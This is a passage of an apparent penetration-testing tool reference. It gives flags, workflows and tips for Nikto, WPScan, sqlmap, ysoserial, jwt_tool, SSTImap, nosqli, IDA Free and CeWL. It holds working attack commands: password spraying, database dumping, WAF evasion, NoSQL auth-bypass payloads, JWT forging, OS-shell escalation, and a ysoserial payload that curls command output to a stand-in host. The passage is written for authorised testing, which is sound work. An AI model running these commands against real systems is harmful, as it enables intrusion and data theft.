            columns: ["Flag", "Description"],
            rows: [
              ["-h <host>", "Target host or URL"],
              ["-p <port>", "Port(s) to scan"],
              ["-ssl", "Force SSL/TLS"],
              ["-o <file> -Format <fmt>", "Output to file (htm, csv, xml, json, txt)"],
              ["-Tuning <ids>", "Restrict to specific check categories"],
              ["-useproxy <url>", "Route through a proxy (e.g. Burp, to log findings)"],
              ["-id <user:pass>", "HTTP basic auth credentials"],
              ["-evasion <ids>", "IDS-evasion techniques (encoding, etc.)"]
            ]
          },
          {
            title: "Tuning Categories",
            type: "table",
            columns: ["ID", "Category"],
            rows: [
              ["1", "Interesting files / seen in logs"],
              ["2", "Misconfiguration / default files"],
              ["3", "Information disclosure"],
              ["4", "Injection (XSS/script/HTML)"],
              ["5", "Remote file retrieval (web root)"],
              ["6", "Denial of service (skip on production)"],
              ["b", "Software identification"],
              ["e", "Reduce false positives"]
            ]
          },
          {
            title: "What It Finds",
            type: "table",
            columns: ["Category", "Examples"],
            rows: [
              ["Dangerous files", "Default CGIs, test scripts, backup files, admin scripts"],
              ["Outdated software", "Server and component versions with known vulnerabilities"],
              ["Misconfigurations", "Directory indexing, dangerous HTTP methods (PUT/DELETE), verbose errors"],
              ["Missing headers", "Absent security headers (X-Frame-Options, CSP, HSTS)"],
              ["Default content", "Sample apps and install pages left in place"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Quick early sweep", cmd: "nikto -h https://target.com -o nikto.html -Format htm\n# read it as a checklist of obvious issues to confirm manually" },
              { label: "Route through Burp for logging", cmd: "nikto -h https://target.com -useproxy http://127.0.0.1:8080\n# every check appears in Burp's history for review" },
              { label: "Skip DoS checks on production", cmd: "nikto -h https://target.com -Tuning 1235bde\n# omit category 6 to avoid disruptive tests" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Nikto is loud and makes no attempt at stealth — every request is obvious in the logs. Run it only where noise is acceptable.",
              "Exclude tuning category 6 (DoS) on anything resembling production.",
              "It produces false positives; treat every finding as a lead to confirm manually, not a confirmed vulnerability.",
              "Proxy it through Burp (-useproxy) so its findings land in your history for follow-up.",
              "It overlaps with Nuclei but still catches some legacy server issues the template scanners miss — run both for coverage."
            ]
          }
        ]
      },
      {
        id: "wpscan",
        name: "WPScan",
        url: "https://github.com/wpscanteam/wpscan",
        description: "WordPress-focused scanner for vulnerable core, plugins, themes, and users.",
        brief: "WordPress runs a huge share of the web, and its security posture is dominated by plugins and themes — thousands of third-party components of wildly varying quality. WPScan is the dedicated scanner for it: it fingerprints the WordPress version, enumerates installed plugins and themes and their versions, cross-references them against a vulnerability database, enumerates users, and can brute-force logins.\n\nIf WhatWeb or Nuclei tells you a target is WordPress, WPScan is the specialised follow-up that turns 'it's WordPress' into a concrete list of vulnerable components.",
        quickReference: [
          { label: "Standard scan", cmd: "wpscan --url https://target.com" },
          { label: "Enumerate vulnerable plugins + users", cmd: "wpscan --url https://target.com -e vp,u --api-token <token>" },
          { label: "Enumerate everything", cmd: "wpscan --url https://target.com -e ap,at,u" },
          { label: "Password brute force", cmd: "wpscan --url https://target.com -U admin -P passwords.txt" }
        ],
        sections: [
          {
            title: "Enumeration Options (-e)",
            type: "table",
            columns: ["Code", "Enumerates"],
            rows: [
              ["vp", "Vulnerable plugins only (fast, high-signal)"],
              ["ap", "All plugins (slower, thorough)"],
              ["vt / at", "Vulnerable / all themes"],
              ["u", "Usernames — the list to brute-force against"],
              ["cb", "Config backups left on the server"],
              ["dbe", "Database exports"],
              ["tt", "Timthumb files (legacy image-resize vulnerabilities)"]
            ]
          },
          {
            title: "Key Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["--url <target>", "The WordPress site"],
              ["--api-token <t>", "WPVulnDB token — required to see actual CVE details (free tier available)"],
              ["-U / -P", "Usernames and password list for brute forcing"],
              ["--plugins-detection <mode>", "passive, aggressive, or mixed detection"],
              ["--random-user-agent", "Rotate UA to dodge simple blocking"],
              ["--throttle <ms>", "Delay between requests"],
              ["-o <file> -f <format>", "Output to file (cli, json)"]
            ]
          },
          {
            title: "Detection Modes",
            type: "table",
            columns: ["Mode", "Trade-off"],
            rows: [
              ["passive", "Only what is visible in page source — quiet, misses inactive plugins"],
              ["aggressive", "Requests each plugin's known paths directly — finds hidden/inactive plugins, much louder"],
              ["mixed", "Passive first, aggressive to confirm — the usual balance"],
              ["Why it matters", "An inactive-but-installed vulnerable plugin is still a risk and only aggressive detection finds it"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard assessment", cmd: "wpscan --url https://target.com \\\n  -e vp,vt,u --api-token <token> \\\n  --plugins-detection mixed -o wpscan.json -f json" },
              { label: "Enumerate users, then spray", cmd: "wpscan --url https://target.com -e u\n# take the usernames, then a careful password attempt:\nwpscan --url https://target.com -U users.txt -P top-passwords.txt --throttle 500" },
              { label: "Deep plugin hunt", cmd: "wpscan --url https://target.com -e ap --plugins-detection aggressive --api-token <token>\n# finds installed-but-inactive plugins passive mode misses" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Get a free WPVulnDB API token — without it WPScan detects versions but cannot tell you which are actually vulnerable.",
              "Aggressive plugin detection is what finds inactive-but-installed vulnerable plugins; passive alone misses them.",
              "User enumeration feeds a login brute force, but mind the lockout/throttle — WordPress and its plugins may rate-limit or ban.",
              "xmlrpc.php is worth checking; when enabled it enables faster brute forcing and can amplify some attacks.",
              "Fingerprint first (WhatWeb/Nuclei) so you only bring WPScan to targets that are actually WordPress."
            ]
          }
        ]
      },
      {
        id: "sqlmap",
        name: "sqlmap",
        url: "https://github.com/sqlmapproject/sqlmap",
        description: "Automated SQL injection detection and database takeover tool.",
        brief: "sqlmap automates the whole lifecycle of SQL injection: it detects whether a parameter is injectable, works out the injection type and database engine, then exploits it — dumping data, reading and writing files, and in the right conditions running commands on the underlying OS. It supports every common technique (boolean/error/time-based blind, UNION, stacked queries) across MySQL, PostgreSQL, MSSQL, Oracle, SQLite, and more.\n\nIt is the reference tool for SQLi, and its depth is enormous — but that depth is why it should be aimed carefully rather than blasted at everything.",
        quickReference: [
          { label: "Test a URL parameter", cmd: "sqlmap -u \"https://target.com/item?id=1\"" },
          { label: "Test a captured request (recommended)", cmd: "sqlmap -r request.txt" },
          { label: "Enumerate databases", cmd: "sqlmap -r request.txt --dbs" },
          { label: "Dump a table", cmd: "sqlmap -r request.txt -D appdb -T users --dump" },
          { label: "Auto-exploit at higher effort", cmd: "sqlmap -r request.txt --batch --level 3 --risk 2" }
        ],
        sections: [
          {
            title: "Target Specification",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-u <url>", "Target URL with a parameter to test"],
              ["-r <file>", "Load a full HTTP request (from Burp) — preserves cookies, headers, method, body"],
              ["--data <string>", "POST body to test"],
              ["-p <param>", "Test only a specific parameter"],
              ["--cookie <c>", "Authenticated session cookie"],
              ["--headers / -H", "Custom headers"],
              ["--method <m>", "HTTP method"]
            ]
          },
          {
            title: "Detection Tuning",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["--level <1-5>", "How thorough: higher tests more parameters, headers, and payloads"],
              ["--risk <1-3>", "How aggressive: higher includes payloads that could modify data"],
              ["--technique <BEUSTQ>", "Restrict to specific techniques (Boolean, Error, Union, Stacked, Time, inline Query)"],
              ["--dbms <name>", "Skip detection by naming the database engine"],
              ["--tamper <scripts>", "Apply payload transformations to evade WAFs"],
              ["--random-agent", "Use a random User-Agent"]
            ]
          },
          {
            title: "Enumeration & Extraction",
            type: "table",
            columns: ["Flag", "Retrieves"],
            rows: [
              ["--dbs", "List databases"],
              ["--tables -D <db>", "List tables in a database"],
              ["--columns -D <db> -T <table>", "List columns"],
              ["--dump -D <db> -T <table>", "Extract table data (add -C for specific columns)"],
              ["--dump-all", "Everything (heavy — rarely appropriate on a real target)"],
              ["--current-user / --current-db", "Context info about the DB session"],
              ["--passwords", "Dump and attempt to crack DB user password hashes"]
            ]
          },
          {
            title: "Beyond Data (High Impact)",
            type: "table",
            columns: ["Flag", "Effect"],
            rows: [
              ["--file-read <path>", "Read a file from the database server's filesystem"],
              ["--file-write / --file-dest", "Write a local file to the server (e.g. a webshell)"],
              ["--os-shell", "Attempt an interactive OS shell (needs stacked queries / high privilege)"],
              ["--os-cmd <cmd>", "Run a single OS command"],
              ["--privileges / --is-dba", "Check DB user privileges — determines what escalation is possible"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard careful test", cmd: "# capture the request in Burp, save as request.txt\nsqlmap -r request.txt --batch --level 2 --risk 1\n# if injectable:\nsqlmap -r request.txt --dbs\nsqlmap -r request.txt -D appdb --tables\nsqlmap -r request.txt -D appdb -T users --dump" },
              { label: "WAF evasion", cmd: "sqlmap -r request.txt --tamper=space2comment,between,charencode \\\n  --random-agent --level 3" },
              { label: "Check for escalation potential", cmd: "sqlmap -r request.txt --is-dba --privileges\n# if DBA and stacked queries work, --os-shell may be possible" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Prefer -r with a captured request over -u; it preserves cookies, headers, and body so you test the endpoint exactly as the app sees it.",
              "Start with low --level/--risk and raise only as needed. High risk includes payloads that can modify or delete data — dangerous on production.",
              "--os-shell and --file-write are powerful and destructive; confirm they are in scope before using them, and never on production without explicit sign-off.",
              "Use --tamper scripts to get past a WAF, but understand each one — some change the payload semantics.",
              "sqlmap confirms and exploits; understanding the injection manually in Burp first makes you far more effective with it."
            ]
          }
        ]
      },
      {
        id: "ysoserial",
        name: "ysoserial",
        url: "https://github.com/frohoff/ysoserial",
        description: "Generates deserialization gadget-chain payloads for Java (and .NET via ysoserial.net).",
        brief: "ysoserial generates payloads that exploit insecure deserialization in Java applications. When an app deserializes attacker-controlled data, and the classpath contains the right 'gadget' libraries, a crafted object graph can trigger a chain of method calls ending in command execution. ysoserial encapsulates dozens of these gadget chains (CommonsCollections, Spring, Groovy, and more) so you can produce a working payload for whatever libraries the target has.\n\nInsecure deserialization is a critical, often-overlooked bug class, and ysoserial (plus the separate ysoserial.net for .NET) is the standard tool for weaponising it.",
        quickReference: [
          { label: "Generate a CommonsCollections payload", cmd: "java -jar ysoserial.jar CommonsCollections1 \"id\" > payload.bin" },
          { label: "List available gadget chains", cmd: "java -jar ysoserial.jar" },
          { label: "Base64-encode for a cookie/param", cmd: "java -jar ysoserial.jar CommonsCollections5 \"id\" | base64 -w0" },
          { label: ".NET equivalent", cmd: "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"cmd\"" }
        ],
        sections: [
          {
            title: "Common Gadget Chains",
            type: "table",
            columns: ["Chain", "Depends on"],
            rows: [
              ["CommonsCollections1-7", "Apache Commons Collections (very common on classpaths)"],
              ["CommonsBeanutils1", "Apache Commons BeanUtils"],
              ["Spring1 / Spring2", "Spring framework"],
              ["Groovy1", "Groovy runtime"],
              ["Hibernate1", "Hibernate ORM"],
              ["Jdk7u21 / URLDNS", "JDK-only — URLDNS is a safe detection probe (triggers a DNS lookup, no RCE)"]
            ]
          },
          {
            title: "Finding the Injection Point",
            type: "table",
            columns: ["Indicator", "Where deserialization happens"],
            rows: [
              ["Java serialized magic bytes", "AC ED 00 05 (raw) or rO0AB (base64) in a cookie, parameter, or body"],
              ["ViewState", "ASP.NET __VIEWSTATE (use ysoserial.net)"],
              ["Framework endpoints", "RMI, JMX, T3 (WebLogic), JSF, and message queues"],
              ["Content-Type", "application/x-java-serialized-object"],
              ["File uploads", "An app that deserializes an uploaded object/session file"]
            ]
          },
          {
            title: "Detection Before Exploitation",
            type: "table",
            columns: ["Step", "Description"],
            rows: [
              ["Spot the blob", "Look for rO0AB / AC ED byte patterns in traffic (Burp)"],
              ["URLDNS probe", "Send a URLDNS payload with a Collaborator/DNS callback — a lookup confirms deserialization without RCE"],
              ["Enumerate gadgets", "Try chains matching likely libraries; errors often reveal the stack"],
              ["Weaponise", "Once a chain lands, swap the command for your objective"],
              ["GadgetProbe / Burp exts", "Help identify which libraries are on the classpath"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Confirm deserialization safely (no RCE)", cmd: "# URLDNS just does a DNS lookup — safe confirmation\njava -jar ysoserial.jar URLDNS \"http://<your-collab>.oastify.com\" | base64 -w0\n# paste into the serialized param; a DNS hit confirms the sink" },
              { label: "Exploit with the right chain", cmd: "# once a library is known/likely:\njava -jar ysoserial.jar CommonsCollections5 \"curl http://you/`whoami`\" \\\n  | base64 -w0\n# deliver in the cookie/param that is deserialized" },
              { label: ".NET ViewState", cmd: "ysoserial.exe -p ViewState -g TypeConfuseDelegate \\\n  -c \"cmd /c ping you\" --generator=<gen> --validationkey=<key>" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Confirm with URLDNS first — it triggers only a DNS lookup, proving the sink deserializes without firing code. It is the safe detection step.",
              "The right gadget chain depends on what libraries are on the target's classpath; CommonsCollections variants are the most common starting point.",
              "Base64 blobs starting rO0AB (or raw bytes AC ED 00 05) are Java serialized objects — the tell-tale sign of a deserialization sink.",
              "For .NET use the separate ysoserial.net, especially for ASP.NET __VIEWSTATE when machine keys leak.",
              "This is critical-severity RCE; exploit only within scope, and use a benign command (DNS/HTTP callback, whoami) as proof."
            ]
          }
        ]
      },
      {
        id: "jwt-tool",
        name: "jwt_tool",
        url: "https://github.com/ticarpi/jwt_tool",
        description: "Tests JSON Web Tokens for signature, algorithm, and claim vulnerabilities.",
        brief: "jwt_tool analyses and attacks JSON Web Tokens. JWTs are everywhere in modern auth, and they carry a well-known set of implementation pitfalls: accepting the 'none' algorithm, confusing RS256 for HS256 so the public key becomes an HMAC secret, weak signing secrets that crack offline, and unvalidated claims you can tamper with. jwt_tool automates testing for all of these and forging tokens once a weakness is found.\n\nIt bundles the standard JWT attack playbook into one tool, so you can go from a captured token to a forged admin token quickly when the implementation is weak.",
        quickReference: [
          { label: "Decode and inspect a token", cmd: "jwt_tool <token>" },
          { label: "Run all known attacks (playbook)", cmd: "jwt_tool <token> -M at -t https://target.com/api -rc \"Authorization: Bearer <token>\"" },
          { label: "Crack the HMAC secret", cmd: "jwt_tool <token> -C -d wordlist.txt" },
          { label: "Tamper claims and re-sign", cmd: "jwt_tool <token> -T -S hs256 -k secret.txt" }
        ],
        sections: [
          {
            title: "Classic JWT Attacks",
            type: "table",
            columns: ["Attack", "Description"],
            rows: [
              ["alg: none", "Strip the signature and set alg to 'none'/'None' — some libraries accept an unsigned token"],
              ["Key confusion (RS256->HS256)", "Sign with HS256 using the public key as the HMAC secret; a server expecting RS256 that verifies with HS256 accepts it"],
              ["Weak secret crack", "Brute/dictionary the HMAC signing secret offline, then forge any token"],
              ["Claim tampering", "Modify claims (role, user, exp) — only exploitable if signature checks are broken/missing"],
              ["kid injection", "Abuse the 'kid' header for path traversal or SQL injection to control the key"],
              ["jwks / jku spoofing", "Point key-URL headers at a key you control"]
            ]
          },
          {
            title: "Modes",
            type: "table",
            columns: ["Flag", "Mode"],
            rows: [
              ["(default)", "Decode and display header, payload, and signature"],
              ["-T", "Tamper — interactively edit claims"],
              ["-C -d <list>", "Crack the HMAC secret against a wordlist"],
              ["-X <attack>", "Run a specific exploit (a=alg:none, k=key-confusion, etc.)"],
              ["-M at", "Run all tests against a live endpoint"],
              ["-S <alg> -k <key>", "Sign with a chosen algorithm and key"],
              ["-V -pk <file>", "Verify against a public key"]
            ]
          },
          {
            title: "Live-Target Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-t <url>", "Target endpoint to send test tokens to"],
              ["-rc <header>", "The request header carrying the token (Cookie or Authorization)"],
              ["-rh <header>", "Additional headers to send"],
              ["-cv <string>", "The 'canary' response value that indicates a valid/authenticated response"],
              ["Why it matters", "jwt_tool can auto-detect which forged tokens the server actually accepts"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Full automated playbook", cmd: "jwt_tool eyJ...token -M at \\\n  -t https://target.com/api/me \\\n  -rc \"Authorization: Bearer eyJ...token\" -cv \"\\\"admin\\\"\"\n# runs alg:none, key confusion, and more against the live endpoint" },
              { label: "Crack a weak secret then forge", cmd: "jwt_tool eyJ...token -C -d /usr/share/wordlists/rockyou.txt\n# on success, forge an admin token:\njwt_tool eyJ...token -T -S hs256 -p \"<cracked_secret>\"" },
              { label: "Key confusion with a captured public key", cmd: "jwt_tool eyJ...token -X k -pk public.pem\n# signs with HS256 using the RSA public key as the secret" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Start by decoding the token and reading the header: the alg value tells you which attacks (none, HS/RS confusion) are even applicable.",
              "alg:none and key confusion are implementation bugs — many modern libraries fixed them, but plenty of custom code has not.",
              "A weak HMAC secret is the most common real-world win: crack it offline, then you can forge any claim you like.",
              "Tampering claims only works if the signature check is broken or bypassed — changing 'role':'admin' means nothing against proper verification.",
              "The -M at mode against a live endpoint with a canary value is the fastest way to learn which forged tokens the server actually accepts."
            ]
          }
        ]
      },
      {
        id: "sstimap",
        name: "SSTImap",
        url: "https://github.com/vladko312/SSTImap",
        description: "Detects and exploits Server-Side Template Injection to code execution — the maintained successor to tplmap.",
        brief: "SSTImap is an actively maintained, Python 3 tool for Server-Side Template Injection — the bug where user input is embedded into a server-side template and evaluated, letting you run template code and, very often, escalate to full command execution. It is the modern successor to the long-abandoned tplmap: same idea, rewritten and kept current, with support for a wide range of engines (Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, ERB, and more).\n\nSSTI is common wherever apps build responses from templates with user-controlled data, and it is high impact because most template engines expose a documented path to the underlying OS.",
        quickReference: [
          { label: "Test a URL parameter", cmd: "python3 sstimap.py -u \"https://target.com/page?name=John\"" },
          { label: "Test POST data", cmd: "python3 sstimap.py -u https://target.com/page -d \"name=John\"" },
          { label: "Get an OS shell", cmd: "python3 sstimap.py -u \"https://target.com/page?name=John\" --os-shell" },
          { label: "The classic detection probe", cmd: "Inject ${7*7} / {{7*7}} / <%= 7*7 %> and look for 49" }
        ],
        sections: [
          {
            title: "Detection Basics",
            type: "table",
            columns: ["Probe", "Engine hint"],
            rows: [
              ["{{7*7}} -> 49", "Jinja2, Twig (curly-brace engines)"],
              ["${7*7} -> 49", "Freemarker, Velocity (dollar-brace)"],
              ["<%= 7*7 %> -> 49", "ERB (Ruby)"],
              ["{7*7} -> 49", "Smarty and similar"],
              ["#{7*7} -> 49", "Some Ruby / others"],
              ["Polyglot", "${{<%[%'\"}}%\\ — a probe that errors or reflects across many engines"]
            ]
          },
          {
            title: "Key Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-u <url>", "Target URL"],
              ["-d <data>", "POST data to test"],
              ["-e <engine>", "Force a specific template engine"],
              ["-p <param>", "Test only a specific parameter"],
              ["-H / -c", "Custom headers and cookies (authenticated testing)"],
              ["--os-cmd <cmd>", "Run a single OS command"],
              ["--os-shell", "Interactive OS shell"],
              ["--upload / --download", "Transfer files through the injection"],
              ["-X / --crawl", "Crawl the target to find injectable parameters"]
            ]
          },
          {
            title: "Why SSTI Escalates to RCE",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Templates evaluate code", "The engine is a small language interpreter running server-side"],
              ["Object / sandbox escape", "Jinja2 / Twig sandbox escapes reach Python / PHP internals and then os.system"],
              ["Built-in exec paths", "Freemarker / Velocity expose classes that run OS commands directly"],
              ["Data exposure minimum", "Even without RCE, SSTI leaks config, secrets, and internal objects"],
              ["SSTImap's job", "Fingerprint the engine and walk the known escape chain to a shell"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Confirm by hand, then automate", cmd: "# inject {{7*7}} (and ${7*7}, <%= 7*7 %>) in each reflected field\n# a rendered 49 confirms SSTI, then:\npython3 sstimap.py -u \"https://target.com/greet?name=John\"" },
              { label: "Escalate to command execution", cmd: "python3 sstimap.py -u \"https://target.com/greet?name=John\" --os-cmd id\n# then --os-shell for interactive access (scope permitting)" },
              { label: "Crawl then test", cmd: "python3 sstimap.py -u https://target.com --crawl 2 --forms\n# discovers parameters/forms and tests each for SSTI" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Confirm SSTI manually first with math probes ({{7*7}}, ${7*7}, <%= 7*7 %>) — a rendered 49 is unambiguous and names the engine family.",
              "SSTI is not just data disclosure; most engines have a documented escape to OS command execution, so treat it as potential RCE.",
              "SSTImap is the maintained Python 3 replacement for tplmap — prefer it; the old tplmap is Python 2 and abandoned.",
              "Distinguish SSTI from plain XSS: {{7*7}} rendering as 49 is server-side evaluation, not client-side reflection.",
              "Stop at a proof (id / whoami) unless full exploitation is explicitly in scope; PayloadsAllTheThings documents the manual escapes per engine if the tool struggles."
            ]
          }
        ]
      },
      {
        id: "nosqli",
        name: "nosqli",
        url: "https://github.com/Charlie-belmer/nosqli",
        description: "Fast, maintained NoSQL injection scanner focused on MongoDB.",
        brief: "nosqli is a Go-based scanner for NoSQL injection, focused on MongoDB. NoSQL databases do not use SQL, but they are still injectable — through operator injection (smuggling in query operators like $ne, $gt, $regex), authentication bypasses, and boolean/error-based extraction. nosqli automates detecting and confirming these, and it is actively maintained and simple to run, which is why it is the reliable choice over the older, finicky NoSQLMap.\n\nNoSQL injection is common precisely because developers who have learned to parameterise SQL often do not realise their NoSQL queries are just as vulnerable to operator smuggling.",
        quickReference: [
          { label: "Scan a URL for NoSQLi", cmd: "nosqli scan -t \"https://target.com/search?q=test\"" },
          { label: "Scan a POST request", cmd: "nosqli scan -t https://target.com/login -r POST -d '{\"user\":\"a\",\"pass\":\"b\"}'" },
          { label: "The classic auth-bypass payload", cmd: "username[$ne]=x&password[$ne]=x" },
          { label: "JSON operator injection", cmd: "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}" }
        ],
        sections: [
          {
            title: "Attack Types",
            type: "table",
            columns: ["Type", "Description"],
            rows: [
              ["Operator injection", "Inject MongoDB operators ($ne, $gt, $regex, $where) to alter query logic"],
              ["Authentication bypass", "$ne / $gt operators make a login query always true"],
              ["Boolean / error-based", "Infer data from response differences when output is not reflected"],
              ["Blind extraction", "$regex character-by-character extraction of values like passwords"],
              ["JavaScript injection", "Inject into $where or mapReduce where server-side JS is evaluated"]
            ]
          },
          {
            title: "Key Operators Abused",
            type: "table",
            columns: ["Operator", "Effect"],
            rows: [
              ["$ne", "Not equal — 'password not equal to x' is true for any real password"],
              ["$gt / $lt", "Greater / less than — another always-true trick"],
              ["$regex", "Pattern match — extract values one character at a time (blind)"],
              ["$where", "Evaluate a JavaScript expression server-side — the dangerous one"],
              ["$exists", "Test whether a field exists"],
              ["$in", "Match any value in a list"]
            ]
          },
          {
            title: "Injection Contexts",
            type: "table",
            columns: ["Context", "How to inject"],
            rows: [
              ["URL parameters", "param[$ne]=x — PHP / Express parse bracket notation into nested objects"],
              ["JSON body", "{\"field\": {\"$ne\": null}} — inject the operator as a nested object"],
              ["Form-encoded", "field[$ne]=x in the POST body"],
              ["Why it works", "The app passes user input straight into the query object without sanitising operators"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Manual auth bypass first", cmd: "# in Burp, change the login body from:\n#   {\"user\":\"admin\",\"pass\":\"x\"}\n# to:\n#   {\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}\n# a successful login confirms NoSQL injection" },
              { label: "Automated scan of an endpoint", cmd: "nosqli scan -t \"https://target.com/search?q=test\"\n# confirms injectable parameters and the working operator" },
              { label: "Blind extraction with regex", cmd: "# brute-force each character of a secret:\n#   pass[$regex]=^a  ... ^b ... until the response changes\n# automate the character walk once a $regex injection is confirmed" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The $ne authentication bypass is the canonical NoSQL injection — try it by hand in Burp before automating; it is often a one-request win.",
              "Bracket notation (param[$ne]=x) works because Express and PHP parse it into a nested object the query then trusts.",
              "$where and mapReduce evaluate server-side JavaScript — those are the paths from injection to code execution, so prioritise finding them.",
              "nosqli is the maintained, reliable choice for NoSQL injection; the older NoSQLMap is finicky and intermittently maintained.",
              "An exposed, unauthenticated MongoDB on 27017 (from Shodan / Censys recon) is a direct-dump situation — no injection needed."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Forensics / Reverse Engineering",
    tools: [
      {
        id: "ida-free",
        name: "IDA Free",
        url: "https://hex-rays.com/ida-free/",
        description: "Disassembler for static analysis of 32/64-bit binaries, free tier.",
        brief: "IDA is one of the most established disassemblers. The free tier covers static disassembly of 32/64-bit binaries — no debugger, no Hex-Rays pseudocode decompiler, but plenty for orienting yourself in an unfamiliar binary.",
        quickReference: [
          { label: "Load a binary", cmd: "File > Open  (let auto-analysis finish before doing anything else)" },
          { label: "Jump to strings", cmd: "Shift+F12  — fastest way to orient in an unfamiliar binary" },
          { label: "Cross-references to a selection", cmd: "X" },
          { label: "Toggle graph / linear view", cmd: "Space" }
        ],
        sections: [
          {
            title: "Interface Layout",
            type: "table",
            columns: ["Pane", "Description"],
            rows: [
              ["Functions window", "Every function IDA recognized — the main index into the binary"],
              ["Strings window", "Every printable string embedded in the binary — often the fastest orientation point"],
              ["Hex view", "Raw byte view alongside disassembly, synced to the current address"],
              ["Graph view", "Disassembly rendered as basic blocks connected by branches"],
              ["Output window", "IDA's own log — analysis progress, script output, errors"]
            ]
          },
          {
            title: "Functions",
            type: "table",
            columns: ["Action", "Description"],
            rows: [
              ["Functions window", "Lists every recognized function by name/address — double-click to jump to it"],
              ["N", "Rename the function or variable under the cursor — do this as you go, not at the end"],
              ["Likely entry points", "Look for main, WinMain, or DllMain first — everything else usually branches from there"]
            ]
          },
          {
            title: "Strings",
            type: "table",
            columns: ["Action", "Description"],
            rows: [
              ["Shift+F12", "Open the Strings window"],
              ["Filter box", "Search/filter the string list by substring"],
              ["Pivot via xref", "Double-click a suspicious string, then X to jump back into the code that references it"]
            ]
          },
          {
            title: "Cross References",
            type: "table",
            columns: ["Action", "Description"],
            rows: [
              ["X", "Show all references TO the selected function or variable"],
              ["Ctrl+X", "Alternate xref view (depending on IDA version/context)"],
              ["Reading the xref list", "Shows every caller of a function or every use of a variable — the fastest way to understand how something is actually used"]
            ]
          },
          {
            title: "Graph View",
            type: "table",
            columns: ["Action", "Description"],
            rows: [
              ["Basic blocks", "Each box is a straight-line block of instructions; arrows are branches"],
              ["Collapse / expand node", "Right-click a node to collapse it and reduce visual noise in a large function"],
              ["When to switch to linear view", "Tight loops or dense data blobs are usually easier to read as plain linear disassembly (Space toggles this)"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Static analysis workflow", cmd: "1. Load the binary, let auto-analysis finish\n2. Check the Strings window for anything suspicious\n3. Pivot via xrefs (X) into the function that uses it\n4. Rename functions/variables as you understand them\n5. Note: free tier has no F5 pseudocode — read raw disassembly" },
              { label: "Reverse engineering workflow", cmd: "1. Identify the entry point (main/WinMain/DllMain)\n2. Trace major control flow in Graph view\n3. Flag calls to interesting APIs (network, file, registry)\n4. Cross-reference each flagged call to see where it's invoked from\n5. Document findings function-by-function as you go" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The free tier has no debugger and no Hex-Rays decompiler — disassembly and static analysis only.",
              "Rename functions and variables as you go — future-you (or whoever you hand the analysis to) will thank you.",
              "If a task genuinely needs a decompiler or a debugger, Ghidra is a solid free fallback for that specific step."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Wordlists",
    tools: [
      {
        "id": "cewl",
        "name": "CeWL",
        "url": "https://github.com/digininja/CeWL",
        "description": "Crawl a target site to build a custom wordlist from its own content.",
        "brief": "CeWL (Custom Word List generator) spiders a website to a chosen depth and harvests the unique words it finds, producing a wordlist tuned to that organisation — product names, jargon, employee names, locations. Because people build passwords from words they see every day, a CeWL list frequently beats a generic dictionary for targeted spraying and cracking. It can also collect email addresses and file metadata along the way.",
        "quickReference": [
          {
            "label": "Build a wordlist",
            "cmd": "cewl -d 2 -m 5 -w wordlist.txt https://target.com"
          },
          {
            "label": "Also harvest emails",
            "cmd": "cewl -e --email_file emails.txt https://target.com"
          },
          {
            "label": "Pull metadata (authors, software)",
            "cmd": "cewl -a --meta_file meta.txt https://target.com"
          }
        ],
        "sections": [
          {
            "title": "Useful Flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-d <n>",
                "Crawl depth (default 2)"
              ],
              [
                "-m <n>",
                "Minimum word length to keep"
              ],
              [
                "-w <file>",
                "Write the wordlist to a file"
              ],
              [
                "-e / --email_file",
                "Extract email addresses too"
              ],
              [
                "-a / --meta_file",
                "Extract document metadata (authors, software)"
              ],
              [
                "--lowercase",
                "Force words to lowercase"
              ],
              [
                "-c",
                "Show a count of each word (rank by frequency)"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Feed the output to hashcat rules or a password sprayer — combine with mangling (e.g. hashcat -r best64.rule) for real-world variants.",
              "Respect scope and rate limits; deep crawls of a live site generate noticeable traffic."
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Targeted wordlist",
                "cmd": "cewl -d 2 -m 5 -w words.txt https://target.com"
              },
              {
                "label": "Harvest emails + metadata",
                "cmd": "cewl -e --email_file emails.txt -a --meta_file meta.txt https://target.com"
              },
              {
                "label": "With counts, through a proxy",
                "cmd": "cewl -d 3 -c --proxy_host 127.0.0.1 --proxy_port 8080 https://target.com"
              },
              {
                "label": "Feed a rule-based crack",
                "cmd": "cewl -d 2 -m 6 https://target.com -w words.txt   # then use words.txt with your rules"
              }
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
